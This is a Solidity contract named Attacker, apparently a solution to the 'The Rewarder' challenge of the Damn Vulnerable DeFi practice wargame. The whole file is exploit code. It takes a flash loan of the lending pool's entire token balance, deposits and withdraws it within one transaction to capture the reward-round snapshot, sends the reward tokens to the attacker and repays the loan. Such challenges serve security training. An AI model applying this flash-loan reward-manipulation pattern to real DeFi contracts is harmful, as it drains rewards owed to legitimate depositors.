// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {TheRewarderPool} from "./TheRewarderPool.sol";
import {FlashLoanerPool} from "./FlashLoanerPool.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";
import {RewardToken} from "./RewardToken.sol";

contract Attacker {
    address public immutable attacker;
    address public immutable rewarderPool;
    address public immutable flashLoanPool;
    address public immutable dvt;
    address public immutable rewardToken;

    constructor(address _rewarderPool, address _flashLoanPool, address _dvt, address _rewardToken) {
        attacker = msg.sender;
        rewarderPool = _rewarderPool;
        flashLoanPool = _flashLoanPool; 
        dvt = _dvt;
        rewardToken = _rewardToken;
    }

    modifier onlyAttacker() {
        require(msg.sender == attacker, "only attacker");
        _;
    }

    function attack() external onlyAttacker {
        require(rewarderPool != address(0) && flashLoanPool != address(0) && TheRewarderPool(rewarderPool).isNewRewardsRound());
        FlashLoanerPool(flashLoanPool).flashLoan(DamnValuableToken(dvt).balanceOf(flashLoanPool));
    }

    function receiveFlashLoan(uint256 _amount) external {
        DamnValuableToken(dvt).approve(rewarderPool, _amount);
        TheRewarderPool(rewarderPool).deposit(_amount);
        TheRewarderPool(rewarderPool).withdraw(_amount);
        RewardToken(rewardToken).transfer(attacker, RewardToken(rewardToken).balanceOf(address(this)));
        DamnValuableToken(dvt).transfer(flashLoanPool, _amount);
    }
}
